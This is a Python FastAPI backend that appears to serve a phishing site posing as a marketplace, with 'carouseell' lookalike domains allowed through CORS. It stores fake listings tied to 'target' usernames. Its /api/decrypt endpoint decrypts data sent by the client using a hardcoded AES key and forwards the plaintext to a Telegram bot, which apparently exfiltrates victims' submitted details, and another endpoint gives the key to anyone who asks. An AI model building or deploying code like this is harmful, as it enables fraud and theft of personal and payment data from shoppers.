from fastapi import FastAPI, Depends, status, Cookie, Request
from fastapi.responses import JSONResponse
from jose import jwt
from sqlalchemy.orm import Session
from database.connection import get_db
from models.model import Cart
from models import model
from database.connection import engine
from fastapi.middleware.cors import CORSMiddleware
from fastapi.exceptions import HTTPException
import httpx
import base64
from config import BOT_TOKEN, CHAT_ID, SECRET_KEY, ENCRYPTION_KEY
from Crypto.Cipher import AES

model.Base.metadata.create_all(bind=engine)
# import secrets

# Генерация 16-байтового ключа AES
# encryption_key = secrets.token_bytes(16)
# print(encryption_key.hex())

app = FastAPI(docs_url=None)
# app = FastAPI()


origins = [	'http://localhost:3000', 
			'http://localhost:3001', 
			'http://localhost:3002', 
           	'https://carouseell.com',
           	'https://carouseell.store',
        	] 

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["POST", 'GET'],
    allow_headers=["*"],
)


async def send_telegram_message(bot_token: str, chat_id: str, message: str ):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "HTML"
    }

    async with httpx.AsyncClient() as client:
        response = await client.post(url, json=data)
        response.raise_for_status()
        
# @app.post("/api/send_data")
async def send_message_to_telegram(message: str):
    await send_telegram_message(BOT_TOKEN, CHAT_ID, message)
    return {"status": "Message sent successfully"}

@app.get('/api/get_data')
def create_user(
    db: Session = Depends(get_db)
    ):
    all_data = db.query(Cart).all();
    return all_data;




@app.post("/api/fetch_user_data")
def create_user(
    db: Session = Depends(get_db),
    formData: model.CartRequestForm = Depends()
    ):
    try:
        existing_cart = db.query(Cart).filter_by(product_id=formData.product_id).first()
        if existing_cart:
            raise HTTPException(status_code=400, detail='product_id already exists')
        else:
            cartQuery = Cart(
				product_id=formData.product_id, 
				product_id_url=formData.product_id_url,
				target_username=formData.target_username,
				target_photo_url=formData.target_photo_url,
				item_photo_url=formData.item_photo_url,
				item_name=formData.item_name,
				item_price=formData.item_price,
				)
            db.add(cartQuery)
            db.commit()
            db.refresh(cartQuery)
            return cartQuery
    except HTTPException as e:
        raise HTTPException(status_code=400, detail=e)
    

# secret_key = 'mySecretKey12356'
    
@app.get('/api/get_encryption_key')
def get_encryption_key():
    try:
        encryption_key = ENCRYPTION_KEY
        return JSONResponse(content={'encryption_key': encryption_key.hex()})
    except Exception as e:
        raise HTTPException(status_code=500, detail='Failed to generate encryption key')

def decrypt_text(encrypted_text, key):
    encrypted_text = base64.b64decode(encrypted_text)
    iv = encrypted_text[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_bytes = cipher.decrypt(encrypted_text[AES.block_size:])
    decrypted_text = decrypted_bytes.decode("utf-8", errors="ignore").strip()
    return decrypted_text

@app.post("/api/decrypt")
async def decrypt_handler(encrypted_text: dict):
    encrypted_text = encrypted_text["encrypted_text"]
    encryption_key = b'3c63120d2251f5ac57c2efd1d2c54ad1'  # 16-байтовый ключ шифрования
    decrypted_text = decrypt_text(encrypted_text, encryption_key)
    await send_message_to_telegram(decrypted_text)
    return {"decrypted": 'success'}